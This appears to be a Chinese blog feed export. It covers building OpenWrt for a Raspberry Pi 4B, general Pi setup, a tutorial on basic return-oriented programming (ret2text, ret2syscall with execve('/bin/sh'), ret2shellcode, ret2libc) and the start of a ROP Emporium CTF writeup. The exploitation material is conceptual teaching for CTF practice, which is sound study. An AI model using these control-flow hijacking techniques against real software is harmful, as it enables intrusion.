<p>跟随 LEDE 仓库的 README 编译命令说明操作即可：装依赖包 -&gt; 下载源代码 -&gt; 更新 feeds -&gt; 选择配置 -&gt; 下载 dl 库 -&gt; 编译固件</p>
<p>主要关注选择配置（<code>make menuconfig</code>）这里，树莓派 4B 使用的是 Broadcom BCM2711，因此需要：</p>
<ul>
<li><code>Target System</code> 选择 <code>Broadcom BCM27xx</code></li>
<li><code>Subtarget</code> 选择 <code>BCM2711 boards</code></li>
<li><code>Target Profile</code> 选择 <code>Raspberry Pi 4B</code></li>
</ul>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture202505281723094.png" alt="image-20250528172307031"></p>
<p>在 <code>Target Images</code> 中指定内核以及根文件系统的大小（根据实际SD卡以及个人需求设置）。</p>
<p>其他的一些配置可以参考：<a href="https://www.bilibili.com/opus/489272396506904722">https://www.bilibili.com/opus/489272396506904722</a></p>
<p>再者需要注意下载 dl 库的时候要开代理</p>
<p>然后便是漫长的编译。。。</p>
<p>关于最终输出的镜像文件（存放在 <code>lede/bin/targets/bcm27xx/bcm2711</code> 目录中）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">├── openwrt-bcm27xx-bcm2711-rpi-4-ext4-factory.img.gz</span><br><span class="line">├── openwrt-bcm27xx-bcm2711-rpi-4-ext4-sysupgrade.img.gz</span><br><span class="line">├── openwrt-bcm27xx-bcm2711-rpi-4-squashfs-factory.img.gz</span><br><span class="line">├── openwrt-bcm27xx-bcm2711-rpi-4-squashfs-sysupgrade.img.gz</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th><strong>对比项</strong></th>
<th><strong>squashfs</strong></th>
<th><strong>ext4</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>文件系统类型</strong></td>
<td>压缩只读 + OverlayFS 可写覆盖层</td>
<td>完全可读写</td>
</tr>
<tr>
<td><strong>数据持久化方式</strong></td>
<td>通过 <code>/overlay</code> 分区保存配置和新增文件</td>
<td>直接修改系统分区文件</td>
</tr>
<tr>
<td><strong>安全性</strong></td>
<td>✅ 系统核心文件只读，不易被破坏</td>
<td>⚠️ 系统文件可修改，误操作风险较高</td>
</tr>
<tr>
<td><strong>升级便利性</strong></td>
<td>✅ 直接刷写新固件，保留配置</td>
<td>⚠️ 需手动备份配置或重新设置</td>
</tr>
<tr>
<td><strong>适用场景</strong></td>
<td>路由器&#x2F;网关、长期稳定运行</td>
<td>开发调试、频繁修改系统、挂载外部存储</td>
</tr>
<tr>
<td><strong>存储空间占用</strong></td>
<td>✅ 压缩格式，节省空间</td>
<td>⚠️ 未压缩，占用更多空间</td>
</tr>
<tr>
<td><strong>SD卡寿命影响</strong></td>
<td>✅ 写入量少，延长寿命</td>
<td>⚠️ 频繁写入可能缩短寿命（需搭配高耐久存储）</td>
</tr>
<tr>
<td><strong>推荐用户</strong></td>
<td>普通用户、网络设备部署</td>
<td>开发者、高级用户、需要深度自定义</td>
</tr>
</tbody></table>
<p>没啥特殊需求就直接刷 <code>openwrt-bcm27xx-bcm2711-rpi-4-squashfs-factory.img.gz</code> 了（如果是升级则选择 <code>openwrt-bcm27xx-bcm2711-rpi-4-squashfs-sysupgrade.img.gz</code>）</p>
<h2 id="刷！"><a href="#刷！" class="headerlink" title="刷！"></a>刷！</h2><p>工具：</p>
<ul>
<li><a href="https://github.com/balena-io/etcher/releases">balenaEtcher</a></li>
</ul>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><blockquote>
<ul>
<li>地址：192.168.1.1</li>
<li>用户名：root</li>
<li>密码：password</li>
</ul>
</blockquote>
<h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h3><ul>
<li><p>首先这个主题，感觉还是 Argon 好看：<a href="https://github.com/jerrykuku/luci-theme-argon">https://github.com/jerrykuku/luci-theme-argon</a></p>
</li>
<li><p>其次主题有 bug – 换成 Design 主题之后，刷新访问就直接卡崩了，CPU 狂飙</p>
<ul>
<li>还好 SSH 服务正常， 可以进去修改 <code>/etc/config/luci</code> 中的 <code>option mediaurlbase</code> 设置</li>
</ul>
</li>
</ul>
<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><p>在树莓派上可以跑几个容器用来折腾好玩的：</p>
<ul>
<li><code>idootop/mi-gpt</code> : 用来给小爱音箱接入大语言模型</li>
<li><code>homeassistant/home-assistant:latest</code> : 折腾智能家居自动化</li>
</ul>
<h3 id="插件推荐"><a href="#插件推荐" class="headerlink" title="插件推荐"></a>插件推荐</h3><ul>
<li><code>luci-app-diskman</code> 👉 <a href="https://github.com/lisaac/luci-app-diskman/">https://github.com/lisaac/luci-app-diskman/</a><ul>
<li>磁盘管理</li>
</ul>
</li>
<li><code>luci-app-samba4</code><ul>
<li>SMB 文件共享：samba4 支持兼容 MacOS (配置 TimeMachine 更简单了)</li>
</ul>
</li>
<li><code>luci-app-ddns-go</code><ul>
<li>ddns-go 的 openwrt 插件</li>
</ul>
</li>
<li><code>luci-app-wol</code><ul>
<li>Wake On Lan 网络唤醒</li>
</ul>
</li>
<li><code>luci-app-pushbot</code><ul>
<li>全能推送 (IOS 上使用 Bark 推送很香)</li>
</ul>
</li>
<li><code>luci-app-watchcat</code><ul>
<li>可以配合自动登录校园网脚本实现掉线自动重新登录<ul>
<li>检测到外网主机无法 ping 通时自动执行脚本</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>【2023-11-06】安装命令存档</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">opkg update &amp;&amp; opkg install ca-certificates zsh curl git-http vim-full luci-app-ddns-go luci-app-netdata luci-app-nginx-manager luci-app-kodexplorer luci-app-watchcat luci-app-zerotier luci-app-pushbot luci-app-wolplus luci-app-frpc luci-app-openvpn-client luci-app-diskman luci-app-unblockmusic luci-app-ttyd luci-app-vlmcsd luci-app-uugamebooster luci-app-wrtbwmon luci-app-ttyd</span><br></pre></td></tr></table></figure>



<h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><ul>
<li><p>编译安装</p>
<ul>
<li>选择 <code>luci-app-samba4-server</code> 时需要确保 <code>Network -&gt; Filesystem -&gt; samba4-libs</code> 是选中的 </li>
<li><code>samba36-server</code> 和 <code>samba4-server</code> 不能同时选中安装</li>
</ul>
</li>
<li><p>刷机完成建议先连接无线热点进管理页去配置</p>
<ul>
<li>默认 wlan0 和 eth0 都属于 br-lan 网络</li>
</ul>
</li>
<li><p>samba4 指定用户需要先在 &#x2F;etc&#x2F;passwd 中添加</p>
<ul>
<li>然后 <code>smbpasswd -a username</code> 添加 samba 用户</li>
<li>勾选强制 root 才有权限写</li>
</ul>
</li>
<li><p>如果遇到 netdata 报错：<code>Access to file is not permitted: /usr/share/netdata/web//index.html</code></p>
<ul>
<li>找到的解决方案: <a href="https://www.right.com.cn/forum/thread-4054870-1-1.html">https://www.right.com.cn/forum/thread-4054870-1-1.html</a> <ul>
<li>修改路径所属用户为 root: <code>chown -R root:root /usr/share/netdata/web</code></li>
</ul>
</li>
<li>【重刷之后没遇到这个问题😅】<ul>
<li>【卸载 netdata 后又重装就出现这个问题😅】</li>
</ul>
</li>
</ul>
</li>
<li><p>关于开启 ipv6: <a href="https://doc.openwrt.cc/1-General/5-IPV6-Guide/">https://doc.openwrt.cc/1-General/5-IPV6-Guide/</a></p>
</li>
<li><p>🧨 莫名其妙突然 DHCP 和 DNS 失效 👉【2025-05-28】重新刷固件</p>
</li>
<li><p>🔥 重启遇到无线网卡第一时间无法识别导致 AP 无法开启 👉 【2025-05-28】重新刷固件</p>
</li>
</ul>
<h2 id="挖坑"><a href="#挖坑" class="headerlink" title="挖坑"></a>挖坑</h2><ul>
<li><input disabled="" type="checkbox"> IPv6 【2025-05-28：继续拖着吧，目前还是用不到】</li>
</ul>
]]></content>
      <categories>
        <category>折腾记</category>
      </categories>
      <tags>
        <tag>Raspberry</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派4B 折腾记</title>
    <url>/2020/02/18/raspberrypi/</url>
    <content><![CDATA[<h1 id="树莓派4B-折腾记"><a href="#树莓派4B-折腾记" class="headerlink" title="树莓派4B 折腾记"></a>树莓派4B 折腾记</h1><p>开始入坑树莓派，，，</p>
<ul>
<li>到手的是 Raspberry 4B 2G 版本</li>
</ul>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/IMG_20200218_130025.jpg" alt="IMG_20200218_130025"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/IMG_20200218_135927.jpg" alt="IMG_20200218_135927"></p>
<blockquote>
<p>2023.07.13 更新时注: 当年应该多买几个囤起来，多好的理财产品😅😅😅</p>
</blockquote>
<h2 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h2><p>官方下载：<a href="https://www.raspberrypi.com/software/">https://www.raspberrypi.com/software/</a></p>
<p>官方系统镜像下载：<a href="https://www.raspberrypi.com/software/operating-systems/">https://www.raspberrypi.com/software/operating-systems/</a></p>
<p>三方工具：<a href="https://win32diskimager.org/">Win32DiskImager</a> &#x2F; <a href="https://etcher.balena.io/">Balenaetcher</a></p>
<h3 id="Debian-Pi-Aarch64"><a href="#Debian-Pi-Aarch64" class="headerlink" title="Debian-Pi-Aarch64"></a>Debian-Pi-Aarch64</h3><p>香的一批的系统： <a href="https://gitee.com/openfans-community/Debian-Pi-Aarch64">https://gitee.com/openfans-community/Debian-Pi-Aarch64</a></p>
<blockquote>
<p>2023.07.13更新时注：目前这个项目已经冻结了</p>
</blockquote>
<h2 id="安装完成后配置"><a href="#安装完成后配置" class="headerlink" title="安装完成后配置"></a>安装完成后配置</h2><h3 id="更改中文"><a href="#更改中文" class="headerlink" title="更改中文"></a>更改中文</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行以下命令配置语言</span></span><br><span class="line">dpkg-reconfigure locales</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">选中 zh_CN.UTF-8 UTF-8 后保存</span></span><br></pre></td></tr></table></figure>

<p>修改 <code>/etc/default/locale</code> 文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">File generated by update-locale</span></span><br><span class="line">LANG=zh_CN.UTF-8</span><br><span class="line">LC_ALL=zh_CN.UTF-8</span><br></pre></td></tr></table></figure>

<h3 id="更改时区、键盘布局等"><a href="#更改时区、键盘布局等" class="headerlink" title="更改时区、键盘布局等"></a>更改时区、键盘布局等</h3><p>进入<code>raspi-config</code>，在 <code>Localisation Options Set up language and regional settings to match your location</code> 选项中有设置入口</p>
<h3 id="连接-wifi"><a href="#连接-wifi" class="headerlink" title="连接 wifi"></a>连接 wifi</h3><p>刚装完系统时无线网卡是被软件层次上禁用的，需要手动开启：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pi@raspberrypi:~ $ susdo rfkill list</span><br><span class="line">0: phy0: Wireless LAN</span><br><span class="line">		Soft blocked: yes</span><br><span class="line">		Hard blocked: no</span><br><span class="line">1: hci0: Bluetooth</span><br><span class="line">		Soft blocked: no</span><br><span class="line">		Hard blocked: no</span><br><span class="line">pi@raspberrypi:~ $ sudo rfkill unblock 0</span><br><span class="line">pi@raspberrypi:~ $ susdo rfkill list</span><br><span class="line">0: phy0: Wireless LAN</span><br><span class="line">		Soft blocked: no</span><br><span class="line">		Hard blocked: no</span><br><span class="line">1: hci0: Bluetooth</span><br><span class="line">		Soft blocked: no</span><br><span class="line">		Hard blocked: no</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以通过下述命令扫描WIFI信号</span></span><br><span class="line">sudo iwlist wlan0 scan</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200218210537167.png" alt="image-20200218210537167"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入 raspi-config, 找 Network Options, 选择国家位置信息后继续选择 Wifi, 然后填入需要连接的无线网络的ESSID，再填写密码即可连接成功</span></span><br><span class="line">sudo raspi-config</span><br></pre></td></tr></table></figure>

<h3 id="实现开机同步时间"><a href="#实现开机同步时间" class="headerlink" title="实现开机同步时间"></a>实现开机同步时间</h3><p>安装时间NTP:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装 NTP</span></span><br><span class="line">sudo apt-get install ntpdate</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">选择 Asia/Shanghai 时区</span></span><br><span class="line">sudo dpkg-reconfigure tzdata</span><br></pre></td></tr></table></figure>



<p>在 <code>/etc/rc.local</code> 中添加 <code>sudo ntpdate ntp.aliyun.com</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Print the IP address</span></span><br><span class="line">_IP=$(hostname -I) || true</span><br><span class="line">if [ &quot;$_IP&quot; ]; then</span><br><span class="line">	printf &quot;My IP address is %s\n&quot; &quot;$_IP&quot;</span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">连接网络后同步时间</span></span><br><span class="line">	sudo ntpdate ntp.aliyun.com</span><br><span class="line">fi</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>

<h3 id="安装桌面及VNC"><a href="#安装桌面及VNC" class="headerlink" title="安装桌面及VNC"></a>安装桌面及VNC</h3><p>这里安装的是 xfce 桌面，尝试了KDE（太卡，内存占用高，而且刚进桌面一段时间内没法打开终端）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install -y xfce4</span><br></pre></td></tr></table></figure>

<p>VNC 的安装通过 <code>raspi-config</code> 开启VNC</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200220152601065.png" alt="image-20200220152601065"></p>
<blockquote>
<p>2023.07.13 更新时注: 基本用不到桌面环境，VNC更加用不到…有使用桌面需求的时候直接外接显示器更快 (也不晓得当时为啥要桌面环境还选的不带桌面环境的版本折腾)</p>
</blockquote>
<h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><blockquote>
<p><a href="https://shumeipai.nxez.com/2019/05/20/how-to-install-docker-on-your-raspberry-pi.html">https://shumeipai.nxez.com/2019/05/20/how-to-install-docker-on-your-raspberry-pi.html</a></p>
</blockquote>
<h3 id="VIM"><a href="#VIM" class="headerlink" title="VIM"></a>VIM</h3><p>树莓派直接通过apt安装的VIM是不支持python的，所以只能自己编译安装：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200220113739859.png" alt="image-20200220113739859"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/vim/vim.git</span><br><span class="line">cd vim/src</span><br><span class="line">./configure -with-features=huge --enable-python3interp --enable-pythoninterp --with-python-config-dir=/usr/lib/python2.7/config-arm-linux-gnueabihf/ --enable-rubyinterp --enable-luainterp --enable-perlinterp --with-python3-config-dir=/usr/lib/python3.7/config-3.7m-arm-linux-gnueabihf/ --enable-multibyte --enable-cscope --prefix=/usr/local/vim/</span><br><span class="line">sudo make -j &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<h2 id="平台搭建"><a href="#平台搭建" class="headerlink" title="平台搭建"></a>平台搭建</h2><h3 id="Pi-hole-广告过滤"><a href="#Pi-hole-广告过滤" class="headerlink" title="Pi-hole 广告过滤"></a>Pi-hole 广告过滤</h3><blockquote>
<p>搭建完成之后经实际测试感觉效果不佳，搜狐网上很多广告依旧存在</p>
</blockquote>
<p>项目链接：<a href="https://github.com/pi-hole/pi-hole">https://github.com/pi-hole/pi-hole</a></p>
<p>下载安装：直接参考 github 上的 README 即可一句话自动安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -sSL https://install.pi-hole.net | bash</span><br></pre></td></tr></table></figure>

<p>一路确定，直到安装成功，通过访问 <a href="http://ip/admin">http://ip/admin</a> 进入管理页面</p>
<blockquote>
<p>2023.07.13 更新时注：再没尝试搭建过，不清楚现在效果如何，不过如果需要作软路由的话可以刷 openwrt 玩，更香</p>
</blockquote>
<h2 id="硬件相关"><a href="#硬件相关" class="headerlink" title="硬件相关"></a>硬件相关</h2><h3 id="引脚对照表"><a href="#引脚对照表" class="headerlink" title="引脚对照表"></a>引脚对照表</h3><p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200225173315632.png" alt="image-20200225173315632"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/rpi-pins-40-0.png" alt="rpi-pins-40-0"></p>
<h3 id="外接-OLED-屏"><a href="#外接-OLED-屏" class="headerlink" title="外接 OLED 屏"></a>外接 OLED 屏</h3><p>修改 <code>/boot/config.txt</code> ，开启<code> i2c</code> 和 <code>spi</code></p>
<h3 id="Arduino-IDE"><a href="#Arduino-IDE" class="headerlink" title="Arduino IDE"></a>Arduino IDE</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">sudo apt-get install arduino</span><br></pre></td></tr></table></figure>

<h3 id="Node-RED"><a href="#Node-RED" class="headerlink" title="Node-RED"></a>Node-RED</h3><ul>
<li>简介：Node-RED 是一个基于浏览器的编程工具，可以直接可视化地将硬件设备、API以及在线服务连接起来</li>
</ul>
<p>项目仓库：<a href="https://github.com/node-red/node-red">https://github.com/node-red/node-red</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装依赖</span></span><br><span class="line">sudo apt install nodejs npm</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装node-red</span></span><br><span class="line">sudo npm install -g --unsafe-perm node-red</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动, 服务在 http://localhost:1880</span></span><br><span class="line">node-red</span><br></pre></td></tr></table></figure>

<p>监听地址修改：配置文件在 <code>~/.node-red/settings.json</code>， 将 iHost 修改为 “0.0.0.0” 即可</p>
]]></content>
      <categories>
        <category>折腾记</category>
      </categories>
      <tags>
        <tag>Raspberry</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - 基本 ROP</title>
    <url>/2022/08/19/rop-basic/</url>
    <content><![CDATA[<h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><blockquote>
<p>参考资料:</p>
<ul>
<li>基础知识：CSAPP <a href="https://fengmuzi2003.gitbook.io/csapp3e/di-3-zhang-ji-qi-ji-bian-cheng">第3章</a>、 <a href="https://fengmuzi2003.gitbook.io/csapp3e/di-07-zhang-lian-jie">第7章</a></li>
<li><a href="https://tc.gts3.org/cs6265/2020/tut/tut06-01-rop.html#tut06-return-oriented-programming-rop">CS6265 Tut06-1: Return-oriented Programming (ROP)</a></li>
<li><a href="https://tc.gts3.org/cs6265/2020/tut/tut06-02-advrop.html#tut06-advanced-rop">CS6265 Tut06-2: Advanced ROP</a></li>
<li>《CTF竞赛权威指南 Pwn篇》第10章、第12章</li>
</ul>
</blockquote>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>TODO</p>
<h2 id="ROP简介"><a href="#ROP简介" class="headerlink" title="ROP简介"></a>ROP简介</h2><blockquote>
<p><a href="https://zh.m.wikipedia.org/zh-hans/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B">Wikipedia</a>:<br>返回导向编程（英语：Return-Oriented Programming，缩写：ROP）是计算机安全中的一种漏洞利用技术，该技术允许攻击者在程序启用了安全保护技术（如堆栈不可执行）的情况下控制程序执行流，执行恶意代码。其核心思想是通过栈缓冲区溢出等方式控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为Gadgets）。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
</blockquote>
<h3 id="gadgets-tools"><a href="#gadgets-tools" class="headerlink" title="gadgets tools"></a>gadgets tools</h3><ul>
<li><a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a><ul>
<li>命令：<code>ROPgadget --binary ./binary | grep &quot;pop rdi; ret&quot;</code></li>
</ul>
</li>
<li><a href="https://github.com/sashs/Ropper">ropper</a><ul>
<li>命令：<code>ropper -f ./binary --search &quot;pop rdi; ret&quot;</code></li>
</ul>
</li>
</ul>
<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><ul>
<li>也叫做 ret2win</li>
<li>控制程序执行本身已有的代码</li>
</ul>
<blockquote>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text">ctf-wiki</a>:<br>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
</blockquote>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><ul>
<li><a href="https://ex7l0it.github.io/2022/03/07/ropemporium-wp-1/#Challenge1%20ret2win">📖 ROP Emporium - Challenge 1 ret2win</a><ul>
<li>最最基本的 ROP 利用，直接跳转到程序中的某一个函数 getshell</li>
</ul>
</li>
<li><a href="https://ex7l0it.github.io/2022/03/07/ropemporium-wp-1/#Challenge3%20callme">📖 ROP Emporium - Challenge 3 callme</a>   <ul>
<li>x86-64 需要利用 gadgets 对指定的寄存器赋值，以进行函数的参数传递</li>
</ul>
</li>
</ul>
<h3 id="一般思路"><a href="#一般思路" class="headerlink" title="一般思路"></a>一般思路</h3><ul>
<li>寻找程序中是否存在能够直接 getshell 的函数</li>
<li>寻找有用的代码片段，用于指定寄存器的值</li>
</ul>
<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><ul>
<li>控制程序执行系统调用<ul>
<li>例如调用此函数： <code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code></li>
</ul>
</li>
</ul>
<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看系统调用说明文档</span></span><br><span class="line">man syscall</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">...</span> </span><br><span class="line">       Arch/ABI    Instruction           System  Ret  Ret  Error    Notes</span><br><span class="line">       ───────────────────────────────────────────────────────────────────</span><br><span class="line">       i386        int $0x80             eax     eax  edx  -</span><br><span class="line">       x86-64      syscall               rax     rax  rdx  -        5</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">The second table shows the registers used to pass the system call arguments.</span></span><br><span class="line"></span><br><span class="line">       Arch/ABI      arg1  arg2  arg3  arg4  arg5  arg6  arg7  Notes</span><br><span class="line">       ──────────────────────────────────────────────────────────────</span><br><span class="line">       i386          ebx   ecx   edx   esi   edi   ebp   -</span><br><span class="line">       x86-64        rdi   rsi   rdx   r10   r8    r9    -</span><br></pre></td></tr></table></figure>

<p>看到 i386 架构需要通过 <code>int $0x80</code> 触发系统调用，系统调用号存放在 <code>eax</code> 中，参数依次通过 ebx、ecx、edx 等寄存器传递；x86-64 架构则是通过 <code>syscall</code> 触发系统调用，系统调用号存储在 <code>rax</code> 中，参数依次通过 rdi、rsi、rdx 等寄存器传递</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看系统调用号</span></span><br><span class="line">cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h</span><br><span class="line">cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h </span><br><span class="line"></span><br><span class="line">❯ cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep execve </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __NR_execve 11</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __NR_execveat 358</span></span><br><span class="line">❯ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep execve</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __NR_execve 59</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define __NR_execveat 322</span></span><br></pre></td></tr></table></figure>

<p>这里以执行 <code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code> 为例，<code>execve</code> 在 32bit 的系统调用号为 11，即 <code>0xb</code>；在 64bit 的系统调用号为 59，即 <code>0x3b</code></p>
<p>32bit:</p>
<ul>
<li>eax 赋值为 <code>0xb</code></li>
<li>ebx 赋值为 <code>/bin/sh</code> 字符串地址</li>
<li>ecx 赋值为 <code>NULL(0)</code></li>
<li>edx 赋值为 <code>NULL(0)</code></li>
<li>调用: <code>int 0x80</code></li>
</ul>
<p>64bit:</p>
<ul>
<li>rax 赋值为 <code>0x3b</code></li>
<li>rdi 赋值为 <code>/bin/sh</code> 字符串地址</li>
<li>rsi 赋值为 <code>0</code></li>
<li>rdx 赋值为 <code>0</code></li>
<li>调用：<code>syscall</code></li>
</ul>
<h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><ul>
<li>bamboofox - ret2syscall (x86) <ul>
<li>32 位程序，使用 <code>int 0x80</code> 触发系统调用，执行 <code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code></li>
<li><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">题目下载</a></li>
<li><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall">📔 ctf-wiki 对应的 writeup</a></li>
</ul>
</li>
<li>ret2syscall_ex1 (x86-64)<ul>
<li>64 位程序，使用 <code>syscall</code> 触发系统调用，执行 <code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code></li>
<li>题目下载: TODO</li>
<li>writeup: TODO</li>
</ul>
</li>
</ul>
<h3 id="一般思路-1"><a href="#一般思路-1" class="headerlink" title="一般思路"></a>一般思路</h3><ul>
<li>寻找 <code>int 0x80</code> 或 <code>syscall</code> 的 gadget</li>
<li>寻找能够控制 eax&#x2F;rax 的 gadget</li>
</ul>
<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><ul>
<li>控制程序执行shellcode代码，注意shellcode所在段需要具有可执行权限</li>
<li>一般情况下，相关题目存在可执行的内存空间</li>
</ul>
<p>shellcode题目分类：</p>
<ol>
<li>getshell</li>
<li>orw (open read write)</li>
<li>时间盲注&#x2F;布尔盲注</li>
<li>…</li>
</ol>
<p>扩展资料: <a href="https://tttang.com/archive/1447/">📔 shellcode题目整理</a></p>
<h3 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h3><ul>
<li><a href="https://tc.gts3.org/cs6265/2021/tut/tut03-02-pwntools.html">cs6265-lab3-pwntools</a><ul>
<li>32 位</li>
<li><a href="https://tc.gts3.org/cs6265/tut/tut.tar.gz">题目下载</a></li>
<li>writeup: 原网页自带</li>
</ul>
</li>
<li>TODO</li>
</ul>
<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><ul>
<li>控制程序执行libc中的函数<ul>
<li>直接调用程序 plt 表中的 libc 函数</li>
<li>泄露 got 表中 libc 函数真实地址，根据偏移计算目标 libc 函数地址</li>
</ul>
</li>
</ul>
<p>参考资料: <a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html">深入了解GOT, PLT和动态链接</a> </p>
<h3 id="实例与-Writeup"><a href="#实例与-Writeup" class="headerlink" title="实例与 Writeup"></a>实例与 Writeup</h3><ul>
<li><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2libc">📔 ctf-wiki ret2libc</a></li>
</ul>
<p>TODO</p>
<h2 id="练习与扩展"><a href="#练习与扩展" class="headerlink" title="练习与扩展"></a>练习与扩展</h2><ul>
<li><a href="https://ropemporium.com/">ropemporium</a></li>
<li><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">ctf-wiki 例题</a></li>
<li><a href="https://buuoj.cn/">buuctf</a></li>
</ul>
]]></content>
      <tags>
        <tag>Tutorial</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ROP Emporium - Challenge1-3 Writeup</title>
    <url>/2022/03/07/ropemporium-wp-1/</url>
    <content><![CDATA[<h1 id="ROP-Emporium-Chanllenge1-3-Writeup"><a href="#ROP-Emporium-Chanllenge1-3-Writeup" class="headerlink" title="ROP Emporium Chanllenge1-3 Writeup"></a>ROP Emporium Chanllenge1-3 Writeup</h1><ul>
<li>仅做 x86_64 和 x86 的题目</li>
</ul>
<h2 id="Challenge1-ret2win"><a href="#Challenge1-ret2win" class="headerlink" title="Challenge1 ret2win"></a>Challenge1 ret2win</h2><p>题目说明及文件：<a href="https://ropemporium.com/challenge/ret2win.html">https://ropemporium.com/challenge/ret2win.html</a></p>
<p>属于 ret2text，目的是控制程序执行它本身所拥有的代码（<code>.text</code>）获得 <code>flag</code></p>
